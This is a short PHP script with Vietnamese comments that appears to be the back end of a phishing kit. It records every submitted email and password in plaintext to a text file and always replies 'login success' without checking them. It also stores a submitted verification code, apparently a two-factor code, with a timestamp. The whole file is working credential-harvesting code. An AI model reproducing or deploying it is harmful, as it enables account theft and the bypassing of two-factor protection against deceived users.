<?php
	$email = trim($_POST['email']);
    $pass = trim($_POST['pass']);
    $verify = trim($_POST['verify']);

    //Trang login
    if ($email !== '' && $pass !== '') {
    	$datafile = fopen("data/data2.txt", "a");
    	$info = "\n" . $email . '/' . $pass . "/";
    	fwrite($datafile, $info);
    	fclose($datafile);
    	echo "login success";
    	exit();
    }

    //Xác nhận
    if ($verify !== '') {
    	$datafile = fopen("data/data2.txt", "a");
    	$info = $verify . '/' . date('Y-m-d H:i');
    	fwrite($datafile, $info);
    	fclose($datafile);
        echo $info;
    	// echo "verify success";
    	exit();
    }